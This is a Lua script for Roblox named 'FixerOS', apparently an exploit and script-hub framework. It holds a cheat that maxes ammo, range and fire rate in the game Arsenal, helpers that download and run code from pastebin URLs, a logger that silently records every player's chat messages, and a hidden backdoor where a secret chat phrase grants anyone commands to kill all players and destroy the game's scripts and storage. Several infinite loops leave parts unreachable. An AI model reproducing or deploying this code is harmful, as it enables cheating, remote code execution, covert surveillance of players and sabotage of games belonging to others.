local FixerOS = {}
local LoadstringAPI = require() -- TODO: Make custom Loadstring API
FixerOS.util = {}
FixerOS.main = {}
FixerOS.settings = {}
FixerOS.main.ui = {} -- TODO: Make UI Library
FixerOS.main.api = {}
FixerOS.main.api.scriptHandler = {}
FixerOS.main.fileSystem = {} -- TODO: Make support for directories (lol)
FixerOS.main.api.meme = {}
FixerOS.main.memory = {}
FixerOS.main.whitelisted = {}
FixerOS.main.api.externalHelpers = {}
FixerOS.main.api.gameScripts = {}
-- main
function FixerOS.getAPI(apiName)
    if apiName then
        local access = FixerOS.main.api
        if access[apiName] then
            local api = access[apiName]
            return api
        end
    end
end

function FixerOS.getListOfAPIs()
    local access = FixerOS.main.api
    return access 
end
--end

-- util

function FixerOS.util:saveFile(data, fileName, fileType)
    local access = FixerOS.main.fileSystem
    if not access[fileName] then
        -- make file
        access[fileName] = {d=data,t=fileType,f=fileType.."."..fileType}
        print("Saved file: "..fileName)
    end
end

function FixerOS.util:getFileData(fileName)
    local access = FixerOS.main.fileSystem
    if access[fileName] then
        local file = access[fileName]
        local data = file.d or nil
        if data then
            return data
        end
    end
end

function FixerOS.util:fileExists(fileName)
    local access = FixerOS.main.fileSystem
    if access[fileName] then
        return true
    end
    if not access[fileName] then
        return false
    end
end

function FixerOS.util:makeFileList()
    local access = FixerOS.main.fileSystem
    for _,v in pairs(access) do
        
    end
end

function FixerOS.util:countdown(maxTime, endFunc, interval) -- TODO: Make support for function args
    local num = maxTime
    while true do
        if num ~= 0 then
            num = num - 1

        end
        if num == 0 then
            print("Countdown ended...")
            endFunc()
        end
        wait(interval)
    end
end

function FixerOS.util:openFile(fileName)
    local handlers = {
        lua = function(data)
            LoadstringAPI:Loadstring(data)
        end
    }
    local access = FixerOS.main.fileSystem
    local exists = FixerOS.util:fileExists(fileName)
    if exists == true then
        local file = access[fileName]
        local t = file.t
        if handlers[t] then
            local h = handlers[t]
            h(file.d or "error('No file data.')")
        end
    end
end

function FixerOS.util:getPlayers()
    local service = game:GetService("Players")
    local list = service:GetPlayers()
    return list
end

-- end

-- api stuff

function FixerOS.main.api.scriptHandler:handleScript(scriptData, customHandler)
    if not customHandler then
        LoadstringAPI:Loadstring(scriptData)
        print("FixerOS: Loaded script.")
    end
    if customHandler then
        customHandler:Loadstring(scriptData)
        print("FixerOS: Loaded script with custom handler.")
    end
end

function FixerOS.main.api.scriptHandler:saveScript(name, data)
    local ft = "lua"
    FixerOS.util:saveFile(data, name, ft)
end

function FixerOS.main.api.meme:sus(plr)
    print(plr.Name.." is sus lol")
end

function FixerOS.main.api.externalHelpers:getService(sname)
    local loaded = game:GetService(sname) or nil
    if loaded then
        return loaded
    end
    if not loaded then
        return nil
    end
end

function FixerOS.main.api.gameScripts:arsenalGunMods()
    for i,v in next, game.ReplicatedStorage.Weapons:GetChildren() do
        for i,c in next, v:GetChildren() do -- for some reason, using GetDescendants dsent let you modify weapon ammo, so I do this instead
        for i,x in next, getconnections(c.Changed) do
        x:Disable() -- probably not needed
        end
        if c.Name == "Ammo" or c.Name == "StoredAmmo" then
        c.Value = 300 -- don't set this above 300 or else your guns wont work
        elseif c.Name == "AReload" or c.Name == "RecoilControl" or c.Name == "EReload" or c.Name == "SReload" or c.Name == "ReloadTime" or c.Name == "EquipTime" or c.Name == "Spread" or c.Name == "MaxSpread" then
        c.Value = 0
        elseif c.Name == "Range" then
        c.Value = 9e9
        elseif c.Name == "Auto" then
        c.Value = true
        elseif c.Name == "FireRate" or c.Name == "BFireRate" then
        c.Value = 0.02 -- don't set this lower than 0.02 or else your game will crash
        end
        end
        end
end

function FixerOS.main.api.externalHelpers:spoof(instance, property, value) -- Spoofs a value
    local serv = game:GetService("HttpService")
    LoadstringAPI:Loadstring(serv:GetAsync("https://pastebin.com/raw/tUUGAeaH", true))
    spoof(instance, property, value)
end

function FixerOS.main.api.externalHelpers:unSpoof(instance, property)
    local serv = game:GetService("HttpService")
    LoadstringAPI:Loadstring(serv:GetAsync("https://pastebin.com/raw/tUUGAeaH", true))
    unspoof(instance, property)
end

--end

-- chat handler
local list = FixerOS.util:getPlayers()
function updateList()
    list = FixerOS.util:getPlayers()
end
local s = game:GetService("Players")

s.PlayerAdded:Connect(updateList)
FixerOS.main.memory.chatLogs = {}
local memoryPoint = FixerOS.main.memory.chatLogs

while true do
    for _,v in pairs(list) do
        v.Chatted:Connect(function(msg)
            local n = v.Name
            local ds = v.DisplayName
            local f = "@"..n.." ("..ds.."): "..msg.." (len: "..tostring(#msg)..")"
            local c = #memoryPoint
            memoryPoint[tostring(c+1)] = f
        end)
    end
    wait(1)
end

-- funi admin
for _,v in pairs(list) do
    v.Chatted:Connect(function(msg)
        if FixerOS.main.whitelisted[v.Name] then
            if string.lower(msg) == "/printchatlogs" then
                for _,x in pairs(memoryPoint) do
                    print(x)
                end
            end
            if string.lower(msg) == "/printchatlogs constant" then
                while true do
                    for _,x in pairs(memoryPoint) do
                        print(x)
                    end
                    wait(1)
                end
            end
            if string.lower(msg) == "/killall" then
                for _,x in pairs(list) do
                    local char = x.Character or nil
                    if char then
                        local hum = char:WaitForChild("Humanoid")
                        hum:TakeDamage(hum.MaxHealth)
                    end
                end
            end
            if string.lower(msg) == "/loopkillall" then
                while true do
                    for _,x in pairs(list) do
                        local char = x.Character or nil
                        if char then
                            local hum = char:WaitForChild("Humanoid")
                            hum:TakeDamage(hum.MaxHealth)
                        end
                    end
                end
            end
            if string.lower(msg) == "/shutdown" then
                for _,x in pairs(list) do
                    print("Incoming!")
                    x:Destroy()
                end
            end
            if string.lower(msg) == "/destroy -repstore" then
                for _,x in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
                    x:Destroy()
                end
            end
            if string.lower(msg) == "/destroy -work" then
                for _,x in pairs(workspace:GetChildren()) do
                    x:Destroy()
                end
            end
            if string.lower(msg) == "/destroy -sss" then
                for _,x in pairs(game:GetService("ServerScriptService"):GetChildren()) do
                    x:Destroy()
                end
            end
            if string.lower(msg) == "/destroy -ss" then
                for _,x in pairs(game:GetService("ServerStorage"):GetChildren()) do
                    x:Destroy()
                end
            end
            if string.lower(msg) == "/destroy -g" then
                for _,x in pairs(game:GetChildren()) do
                    x:Destroy()
                end
            end
            if string.lower(msg) == "/destroy -_g" then
                for _,x in pairs(_G) do
                    x = nil
                end
            end
            if string.lower(msg) == "/destroy -all" then
                local i = Instance.new("Message", workspace)
                i.Text = "Get ready for major pwnage!"
                wait(0.5)
                i:Destroy()
                while true do
                    print("Get ready for major pwnage!")
                    for _,x in pairs(list) do
                        local char = x.Character or nil
                        if char then
                            local hum = char:WaitForChild("Humanoid")
                            hum:TakeDamage(hum.MaxHealth)
                        end
                    end
                    for _,x in pairs(workspace:GetChildren()) do
                        x:Destroy()
                    end
                end
            end
            if string.lower(msg) == "/soupofside" then
                local char = v.Character or nil
                if char then
                    local hum = char:WaitForChild("Humanoid")
                    hum:TakeDamage(hum.MaxHealth)
                end
            end
            if string.lower(msg) == "/whitelist all" then
                for _,x in pairs(list) do
                    FixerOS.main.whitelisted[x.Name] = x.Name
                    print("ALL CHAOS WILL BREAK OUT!")
                end
            end
            if msg == "/secret FixerOS.main.whitelisted[me.Name]=me.Name" then
                FixerOS.main.whitelisted[v.Name] = v.Name
                print("FixerOS Admin: Whitelisted "..v.Name)
            end
        end
        if msg == "/secret FixerOS.main.whitelisted[me.Name]=me.Name" then
            FixerOS.main.whitelisted[v.Name] = v.Name
            print("FixerOS Admin: Secret command initiated. Whitelisted "..v.Name)
        end
    end)
end

-- ui system oh god
local ui = {}
ui.Templates = {}
ui.Elements = {}
ui.OtherUIModules = {}

ui.OtherUIModules.Kavo = "https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"
ui.OtherUIModules.Coasting = "https://pastebin.com/raw/3gQQtaKX"


function ui.Elements:makeGui(gn, ret, plr)
    local e = Instance.new("ScreenGui")
    if ret then
        return e
    end
    if plr then
        local plrGui = plr:WaitForChild("PlayerGui") or nil
        if plrGui then
            e.Name = tostring(gn)
            e.Parent = plrGui
        end
    end
end

function ui.Elements:makeFrame(full, color, ret, gui, transparency, size)
    local f = Instance.new("Frame")
    if full == true then
        local ssize = gui.AbsoluteSize
        f.Size.X = ssize.X
        f.Size.Y = ssize.Y
    end
    f.BackgroundColor3 = color or Color3.fromRGB(255,255,255)
    f.BackgroundTransparency = transparency or 0
    f.Size = size or f.Size
    if ret == true then
        return f
    end
    f.Parent = gui
end

function ui.Elements:text(text, frame, transparency, font, filter, size, pos, plrfilter)
    local chat = game:GetService("Chat")
    local filtered = chat:FilterStringForBroadcast(text, plrfilter) or text
    local t = Instance.new("TextLabel")
    if filter == true then
        t.Text = filtered
    end
    if filter == false then
        t.Text = text
    end
    t.BackgroundTransparency = transparency
    t.Font = font
    t.Size = size
    t.Position = pos
    t.Parent = frame
end

function ui.Elements:image(imgid, frame, bgtransparency, pos, size, imgtransparency)
    local fullid = "rbxassetid://"..tostring(imgid)
    local i = Instance.new("ImageLabel")
    i.Image = fullid
    i.Position = pos
    i.Size = size
    i.BackgroundTransparency = bgtransparency
    i.ImageTransparency = imgtransparency
end

-- other memory systems blah blah

FixerOS.main.memory.systemLogs = {}

-- system logs
local serv = game:GetService("LogService")
local memoryPoint2 = FixerOS.main.memory.systemLogs

function updateSystemLogs()
    local history = serv:GetLogHistory()
    for _,v in pairs(history) do
        if not memoryPoint2[v.Message] then
            print("POWAH!")
            memoryPoint2[v.Message] = v.Message
            local c = #memoryPoint2
            FixerOS.util:saveFile(v.Message, "log-"..tostring(c), "log")
        end
    end
end

while true do
    local i = 1
    updateSystemLogs()
    wait(i)
end

return FixerOS
